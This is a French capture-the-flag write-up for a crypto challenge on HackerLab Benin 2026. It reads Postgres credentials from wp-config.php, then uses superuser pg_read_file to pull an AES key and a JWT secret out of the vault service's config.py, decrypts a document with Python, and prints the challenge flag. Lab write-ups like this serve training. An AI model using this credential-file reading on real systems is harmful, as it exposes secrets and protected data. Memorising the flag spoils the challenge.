---
title: "Inside Job Q2 · AES-256-CBC"
platform: "HackerLab Benin 2026"
category: "crypto"
difficulty: "—"
points: 0
os: "—"
date: 2026-11-20
author: "DazBot13-boopt, elielfresnel"
author_github: "DazBot13-boopt"
source: "https://github.com/DazBot13-boopt/hackerlab-benin-2026-wu/blob/main/crypto/inside-job2.md"
tags: [hackerlab-benin-2026, crypto]
status: published
---

# Inside Job : Q2 · AES-256-CBC via fuite pg_read_file

**Catégorie** : crypto  
**Flag** : `HLB2026{aes256cbc_v4ult_c0ntr4ts_n0rv3th}`

## TL;DR

L'API vault stocke un document chiffré AES-256-CBC. La clé n'est pas dans l'environnement WordPress mais dans `config.py` du service vault, lisible via `pg_read_file` sur le Postgres colocalisé.

## Contexte

Depuis le shell RCE `www-data` obtenu à Q1, l'API vault est accessible en interne sur `http://vault:5000`. Le document id=2 (`contrats-partenaires-norveth.pdf`) est retourné chiffré :

```bash
curl -H "Authorization: Bearer <JWT>" http://vault:5000/api/documents/2
# {"encrypted_content_b64":"...","iv_b64":"..."}
```

## Récupération de la clé

Le service vault tourne avec Postgres sur le même conteneur (via supervisord). Les credentials de la base sont dans `wp-config.php` :

```
DB_HOST=vault
DB_USER=postgres
DB_PASSWORD=p0stgr3s-VDC-2026!
DB_NAME=vdc_vault
```

`pg_read_file` dans Postgres superuser permet de lire n'importe quel fichier accessible par le process :

```sql
SELECT pg_read_file('/opt/vault-api/config.py');
```

Résultat :

```
AES_KEY = "4f8b2c1d9e3a7f5068d2b4c6e1a390f572d8e4b6a0c2f198d4e6b8ca0f2d1e3b"
JWT_SECRET = "vdc-jwt-s3cr3t-2026"
```

## Déchiffrement

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import base64

key = bytes.fromhex("4f8b2c1d9e3a7f5068d2b4c6e1a390f572d8e4b6a0c2f198d4e6b8ca0f2d1e3b")
iv = base64.b64decode("<iv_b64 de l'API>")
ct = base64.b64decode("<encrypted_content_b64 de l'API>")

cipher = AES.new(key, AES.MODE_CBC, iv)
pt = unpad(cipher.decrypt(ct), AES.block_size)
print(pt.decode())
```

Le plaintext contient :

```
Jeton de validation du dossier dechiffre :
    HLB2026{aes256cbc_v4ult_c0ntr4ts_n0rv3th}
```

## Pièges

La variable d'environnement `VAULT_AES_KEY` dans WordPress est vide : la clé n'est pas propagée depuis WP. Elle est dans `config.py` du container vault, pas dans son environment Docker. Le honeypot sur la page admin Coffre n'est pas le flag de Q2.

## À retenir

Superuser Postgres peut lire le filesystem via `pg_read_file` et `pg_ls_dir`. Sur un service colocalisé (Flask + Postgres dans le même conteneur), les secrets de config de l'application sont souvent lisibles depuis la base si on a un accès superuser.
